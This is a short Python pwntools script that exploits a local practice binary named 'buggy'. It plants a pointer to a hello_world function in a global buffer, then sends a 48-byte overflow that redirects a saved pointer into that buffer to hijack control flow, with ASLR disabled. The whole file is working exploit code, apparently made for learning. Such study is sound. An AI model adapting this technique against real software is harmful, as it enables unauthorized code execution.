from pwn import *

## Import the ELF file to get access to symbols
elf = ELF('./buggy')

## I turned off ASLR so this will be the load address
elf.address = 0x555555554000

## Launch the process and get a reference to it
p = process('./buggy')

print(p.readline())

## Send the name
name = struct.pack('Q', elf.symbols["_ZL11hello_worldv"])
name += b'z'*(31 - len(name))

p.send(name)

print(p.readline())
p.readline()

print(f'Name at: {hex(elf.symbols["name"])}')
print(f'hello_world at: {hex(elf.symbols["_ZL11hello_worldv"])}')

print('Attach now...')
input()

spl = b'a'*48 + struct.pack('Q', elf.symbols['name'] - 0x10)

p.send(spl)

p.interactive()
